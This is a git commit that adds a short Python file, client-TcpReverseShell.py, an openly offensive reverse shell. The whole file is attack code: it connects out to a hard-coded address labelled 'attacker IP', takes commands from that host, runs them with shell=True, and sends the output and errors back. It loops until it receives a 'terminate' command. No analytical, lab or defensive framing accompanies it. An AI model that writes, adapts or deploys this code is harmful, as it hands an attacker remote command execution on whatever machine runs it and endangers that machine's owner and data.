b5cbd6a6e4ded562d3cfbbcb9e1ed2c9bb24c848
Hatem Mohamed <s3c@s3cg33k.com>
2016-10-11 12:33:25 +0300

    Add files via upload

---
+++ client-TcpReverseShell.py
@@ -0,0 +1,25 @@
+#!/usr/bin/env python
+
+import socket
+import subprocess
+
+
+def connect():
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(('192.168.1.51', 8080)) # attacker IP.
+
+
+	while True:	# keep receiving commands from attacker.
+		command = s.recv(1024)
+
+		if 'terminate' in command: # if we terminate, close the socket and break.
+			s.close()
+			break
+
+		else:
+			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+			s.send( CMD.stdout.read() ) # send back the resualt
+			s.send( CMD.stderr.read() ) # send back the error
+def main ():
+	connect()
+main()
